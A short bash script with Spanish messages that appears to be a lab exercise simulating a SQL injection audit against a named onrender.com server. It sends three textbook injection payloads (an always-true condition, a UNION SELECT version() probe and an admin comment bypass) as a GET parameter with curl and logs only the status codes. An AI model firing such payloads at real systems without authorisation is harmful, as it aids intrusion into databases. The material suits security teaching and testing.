#!/bin/bash
TARGET_URL="https://servidor-web-dmz-mariano-molina.onrender.com"

echo "[+] Iniciando simulacion de auditoria SQL Injection contra: $TARGET_URL"
PAYLOADS=("' OR '1'='1" "' UNION SELECT NULL, version()--" "admin' --")

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Probando payload en parametro GET: $payload"
    curl -s -o /dev/null -w "%{http_code}\n" -G --data-urlencode "user=$payload" "$TARGET_URL"
    sleep 1
done

echo "[+] Pruebas finalizadas."
tail -f /dev/null
